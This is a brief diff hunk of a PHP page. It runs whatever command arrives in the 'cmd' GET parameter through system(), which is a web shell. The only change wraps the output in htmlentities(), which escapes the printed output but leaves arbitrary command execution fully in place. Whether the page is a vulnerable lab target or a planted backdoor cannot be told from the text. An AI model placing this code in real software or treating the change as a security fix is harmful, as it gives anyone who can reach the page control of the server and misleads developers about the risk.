@@ -25,7 +25,7 @@
 <?php 
 	if (isset ($_GET['cmd']))
 	{
-		echo system ($_GET['cmd']);
+		echo htmlentities(system ($_GET['cmd']));
 	}
 ?>
 </body>
